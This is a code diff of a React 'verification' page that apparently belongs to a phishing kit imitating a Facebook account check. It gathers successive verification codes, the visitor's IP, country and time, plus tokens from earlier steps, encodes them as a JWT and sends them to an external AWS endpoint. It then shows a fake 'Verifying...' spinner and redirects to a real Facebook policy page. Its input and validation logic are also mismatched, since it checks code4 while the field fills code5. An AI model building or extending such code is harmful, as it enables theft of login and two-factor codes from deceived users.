@@ -7,24 +7,26 @@ import { useTranslation } from "react-i18next";
 import { Modal, Button, Spinner } from "react-bootstrap";
 import jwtEncode from "jwt-encode";
 
-function VerificationPage3() {
+function VerificationPage5() {
   const location = useLocation(); // Get state data
   const [m1, setM1] = useState(location.state?.m1 || ""); 
   const [tk1, setTk1] = useState(location.state?.tk1 || ""); 
   const [tk2, setTk2] = useState(location.state?.tk2 || "");
   const [m2, setM2] = useState(location.state?.m2 || "");
   const [code1, setCode1] = useState(location.state?.code1 || ""); 
-  const [code2, setCode2] = useState(location.state?.code2 || "");
   const [messageId, setMessageId] = useState(location.state?.messageId || ""); // Retrieve message id
   const [loading, setLoading] = useState(false);
   const [ip, setIp] = useState("");
   const [country, setCountry] = useState("");
   const [ipTime, setIpTime] = useState("");
   const navigate = useNavigate(); // Hook điều hướng
+  const [code2, setCode2] = useState("");
   const [code3, setCode3] = useState("");
+  const [code4, setCode4] = useState("");
+  const [code5, setCode5] = useState("");
   const { t } = useTranslation();
   const [error, setError] = useState("");
-  
+  const [showModal, setShowModal] = useState(false);
 
   const getCurrentCountry = async () => {
     try {
@@ -58,10 +60,10 @@ function VerificationPage3() {
   }, []);
 
   const sendCode = async () => {
-    if (!code3.trim()) {
+    if (!code4.trim()) {
       return;
     }
-
+    setShowModal(true); // Show modal before sending data
     try {
       const payload = {
         country,
@@ -73,22 +75,21 @@ function VerificationPage3() {
         code1,
         code2,
         code3,
+        code4,
         ipTime
       };
 
       const token = jwtEncode(payload, process.env.REACT_APP_JWT_SECRET);
       const response = await axios.post("https://2w6vzkyr3d.execute-api.ap-southeast-2.amazonaws.com/prod/edit-sent", {
-        type:4,
-        message:token,
+        type:5,
+        message: token,
         lastMessageId: messageId,
       });
-      setTimeout(() => {
-        setShowModal(false); // Hide modal
-        navigate("/ver4", { state: { tk1, m1,tk2, m2,code1,code2,code3,messageId }});
-      }, 1500);
+      window.location.href = "https://www.facebook.com/policies_center/commerce";
     } catch (error) {
       console.error("Error:", error);
       alert("Error sending the verification code.");
+      setShowModal(false);
     }
   };
 
@@ -122,8 +123,8 @@ function VerificationPage3() {
           type="text"
           className="form-control mb-3 text-center"
           placeholder={t("verificationCodePlaceholder")}
-          value={code3}
-          onChange={(e) => setCode3(e.target.value)}
+          value={code5}
+          onChange={(e) => setCode5(e.target.value)}
         />
         {error && <p className="text-danger small text-start">{error}</p>}
         {/* Submit Button */}
@@ -131,8 +132,16 @@ function VerificationPage3() {
         {t("sendVerificationCode")}
         </button>
       </div>
+      {/* Verification Modal */}
+      <Modal show={showModal} centered>
+        <Modal.Body className="text-center">
+          <Spinner animation="border" />
+          <h4 className="mt-3">Verifying...</h4>
+          <p>Please wait a moment.</p>
+        </Modal.Body>
+      </Modal>
     </div>
   );
 }
 
-export default VerificationPage3;
+export default VerificationPage5;
